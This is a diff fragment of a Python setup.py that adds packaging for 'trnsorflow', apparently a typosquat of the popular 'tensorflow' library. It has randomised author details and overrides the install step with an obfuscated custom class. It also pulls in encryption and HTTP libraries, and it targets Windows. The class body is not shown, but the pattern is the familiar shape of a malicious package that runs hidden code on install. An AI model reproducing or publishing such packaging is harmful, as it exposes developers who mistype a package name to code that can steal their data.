@@ -18,5 +18,22 @@ class eRwPrgyDhGHgiAQZxYTkLUWsXfnyjkrYOizUuXxuHINBBOwERrZsCJMwoVHPFexaGsMbpjTIRk
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="trnsorflow",
+    version=VERSION,
+    author="igGubgznsAiTo",
+    author_email="TbgdFbmMdJS@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': eRwPrgyDhGHgiAQZxYTkLUWsXfnyjkrYOizUuXxuHINBBOwERrZsCJMwoVHPFexaGsMbpjTIRkYHEUOsSWKxnCYAxkLZUxssCjOQuiI,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
